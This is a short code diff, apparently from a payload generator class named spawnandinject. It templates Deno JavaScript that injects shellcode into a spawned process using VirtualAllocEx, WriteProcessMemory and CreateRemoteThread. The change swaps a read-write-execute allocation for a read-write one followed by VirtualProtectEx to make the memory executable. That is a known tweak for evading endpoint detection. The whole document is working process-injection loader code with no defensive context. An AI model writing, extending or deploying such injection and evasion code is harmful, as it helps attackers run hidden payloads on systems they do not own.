@@ -33,9 +33,12 @@ class spawnandinject:
     const hProcess = view.getBigUint64(0, true);
     const hProc = Deno.UnsafePointer.create(hProcess);
 
-    const address = {VirtualAllocEx}(hProc, null, {shellcodeSize}, 0x3000, 0x40);
+    const address = {VirtualAllocEx}(hProc, null, {shellcodeSize}, 0x3000, 0x4);
 
     {WriteProcessMemory}(hProc, address, shellcode, {shellcodeSize}, null);
+
+    const oldProtect = new Uint8Array(4);
+    {VirtualProtectEx}(hProc, address, {shellcodeSize}, 0x40, oldProtect)
     
     const hThread = {CreateRemoteThread}(hProc, null, 0, address, null, 0, null);
     {WaitForSingleObject}(hThread, 500);
